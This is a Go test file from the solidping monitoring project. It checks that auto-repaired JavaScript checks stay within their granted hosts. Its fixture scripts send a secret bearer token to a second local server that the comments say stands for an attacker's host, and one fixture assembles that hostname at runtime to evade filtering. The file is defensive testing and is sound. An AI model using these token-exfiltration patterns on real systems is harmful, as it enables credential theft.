package checkworker

import (
	"net"
	"net/http"
	"net/http/httptest"
	"sync/atomic"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/require"

	"github.com/fclairamb/solidping/server/internal/checkers/checkerdef"
	"github.com/fclairamb/solidping/server/internal/checkers/checkjs"
	jsconfig "github.com/fclairamb/solidping/server/internal/checkers/checkjs/config"
	"github.com/fclairamb/solidping/server/internal/db/models"
	"github.com/fclairamb/solidping/server/internal/paramkeys"
)

// repairSink counts the requests a test host receives.
func repairSink(t *testing.T) (string, *atomic.Int32) {
	t.Helper()

	hits := &atomic.Int32{}
	srv := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { hits.Add(1) }))
	t.Cleanup(srv.Close)

	_, port, err := net.SplitHostPort(srv.Listener.Addr().String())
	require.NoError(t, err)

	return port, hits
}

// runRepairGrantJob stores an auto-repaired js check (grant over the stored
// script and env, hosts 127.0.0.1) and runs its job through the claim and
// executeJob path, references resolved by materializeConfig. A nil secrets
// stores none.
func runRepairGrantJob(
	t *testing.T, script string, env, secrets map[string]any, granted bool,
) *models.Result {
	t.Helper()

	r := require.New(t)
	runner, dbSvc, ctx := setupTestRunner(t)
	t.Cleanup(func() { _ = dbSvc.Close() })

	worker := models.NewWorker("grant-"+uuid.New().String()[:8], "Grant Worker")
	_, err := dbSvc.DB().NewInsert().Model(worker).Exec(ctx)
	r.NoError(err)
	runner.setWorker(worker)

	org := models.NewOrganization("grant-"+uuid.New().String()[:8], "")
	r.NoError(dbSvc.CreateOrganization(ctx, org))
	r.NoError(dbSvc.SetOrgParameter(ctx, org.UID, paramkeys.StorageKey("tag"), "resolved-tag", true))

	plainEnv := map[string]string{}
	for key, value := range env {
		plainEnv[key], _ = value.(string)
	}

	ai := map[string]any{"repair": "auto"}
	if granted {
		ai["repair_hosts"] = []any{"127.0.0.1"}
		ai["repair_grant"] = jsconfig.RepairDigest(script, plainEnv)
	}

	config := models.JSONMap{"script": script, "env": env, "ai": ai}
	if secrets != nil {
		config["secrets"] = secrets
	}

	check := seedRefCheck(t, ctx, dbSvc, org.UID, "grant-check", string(checkerdef.CheckTypeJS), config)

	jobs, _, err := runner.backend.ClaimJobs(ctx, worker.UID, nil, 10, 10, time.Minute)
	r.NoError(err)
	r.Len(jobs, 1)
	r.NoError(runner.executeJob(ctx, runner.logger, jobs[0]))

	stored, err := dbSvc.GetCheck(ctx, org.UID, check.UID)
	r.NoError(err)
	r.Equal(script, stored.Config["script"], "the stored script keeps its reference")

	return lastResultForJob(t, dbSvc, ctx, jobs[0])
}

// grantSecrets is the secrets map of a check holding its token in `secrets`.
var grantSecrets = map[string]any{"TOKEN": "s3cr3t-token-value"}

// grantScript calls the granted host and, when env.FIRE is "yes", localhost
// (standing for an attacker's host) with the secret.
func grantScript(acmePort, evilPort string) string {
	return `var auth = { headers: { Authorization: "Bearer " + secrets.TOKEN } };
var r = http.get("http://127.0.0.1:` + acmePort + `/", auth);
if (env.FIRE === "yes") { http.get("http://localhost:` + evilPort + `/", auth); }
return { status: r.error ? "down" : "up", output: { e: r.error } };`
}

// paramScript reads its token from env.TOKEN (a `${param:tag}` reference, no
// `secrets`), calls the granted host and, when env.FIRE is "yes", a host it
// builds at runtime (localhost, standing for evilco.test) with the token.
func paramScript(acmePort, evilPort string) string {
	return `var auth = { headers: { Authorization: "Bearer " + env.TOKEN } };
var r = http.get("http://127.0.0.1:` + acmePort + `/", auth);
if (env.FIRE === "yes") { http.get("http://" + ["local", "host"].join("") + ":` + evilPort + `/", auth); }
return { status: r.error ? "down" : "up", output: { e: r.error } };`
}

// Regression (spec 2026-10-26-02): a granted check with no `secrets`, whose
// token comes from a `${param:…}` reference in env, is held on schedule too.
// The branch to a host built at runtime is refused and receives nothing; the
// same check reaching only its granted host runs up.
func TestRepairGrantHoldsAScheduledRunWithoutSecrets(t *testing.T) {
	t.Parallel()

	for _, fire := range []string{"yes", "no"} {
		t.Run("fire="+fire, func(t *testing.T) {
			t.Parallel()

			r := require.New(t)
			acmePort, acmeHits := repairSink(t)
			evilPort, evilHits := repairSink(t)

			result := runRepairGrantJob(t, paramScript(acmePort, evilPort),
				map[string]any{"FIRE": fire, "TOKEN": "${param:tag}"}, nil, true)
			r.NotNil(result.Status)

			if fire == "yes" {
				r.Equal(int(checkerdef.StatusError), *result.Status, result.Output)
				r.Equal(true, result.Output[checkjs.OutputKeyRepairRefused])
			} else {
				r.Equal(int(checkerdef.StatusUp), *result.Status, result.Output)
				r.NotContains(result.Output, checkjs.OutputKeyRepairRefused)
			}

			r.Zero(evilHits.Load(), "the other host received nothing")
			r.Equal(int32(1), acmeHits.Load(), "the granted host was reached")
		})
	}
}

// Regression (spec 2026-10-25-01): a `${…}` reference in the stored script or
// env changes the text materializeConfig hands the checker, which used to
// lift the repair grant. The run is held to the stored grant: the host
// outside it is refused and receives nothing.
func TestRepairGrantHoldsAScheduledRunWithAReference(t *testing.T) {
	t.Parallel()

	cases := map[string]struct {
		suffix string
		env    map[string]any
	}{
		"reference in the script": {suffix: "\n// run ${var:uuid}", env: map[string]any{"FIRE": "yes"}},
		"reference in env":        {env: map[string]any{"FIRE": "yes", "TAG": "${param:tag}"}},
	}

	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			r := require.New(t)
			acmePort, acmeHits := repairSink(t)
			evilPort, evilHits := repairSink(t)

			result := runRepairGrantJob(t, grantScript(acmePort, evilPort)+tc.suffix, tc.env, grantSecrets, true)
			r.NotNil(result.Status)
			r.Equal(int(checkerdef.StatusError), *result.Status, result.Output)
			r.Equal(true, result.Output[checkjs.OutputKeyRepairRefused])
			r.Zero(evilHits.Load(), "the refused host received nothing")
			r.Equal(int32(1), acmeHits.Load(), "positive control: the granted host was reached")
		})
	}
}

// Positive controls: a granted check calling only its granted host runs up,
// and a check with a reference but no grant (a human-written script) is not
// held.
func TestRepairGrantScheduledRunControls(t *testing.T) {
	t.Parallel()

	t.Run("granted host only", func(t *testing.T) {
		t.Parallel()

		r := require.New(t)
		acmePort, acmeHits := repairSink(t)
		evilPort, evilHits := repairSink(t)

		result := runRepairGrantJob(t, grantScript(acmePort, evilPort), map[string]any{"FIRE": "no"}, grantSecrets, true)
		r.Equal(int(checkerdef.StatusUp), *result.Status, result.Output)
		r.NotContains(result.Output, checkjs.OutputKeyRepairRefused)
		r.Equal(int32(1), acmeHits.Load())
		r.Zero(evilHits.Load())
	})

	t.Run("reference without a grant", func(t *testing.T) {
		t.Parallel()

		r := require.New(t)
		acmePort, acmeHits := repairSink(t)
		evilPort, evilHits := repairSink(t)

		result := runRepairGrantJob(t, grantScript(acmePort, evilPort)+"\n// run ${var:uuid}",
			map[string]any{"FIRE": "yes"}, grantSecrets, false)
		r.Equal(int(checkerdef.StatusUp), *result.Status, result.Output)
		r.Equal(int32(1), acmeHits.Load())
		r.Equal(int32(1), evilHits.Load(), "not held: the other host is reachable")
	})
}
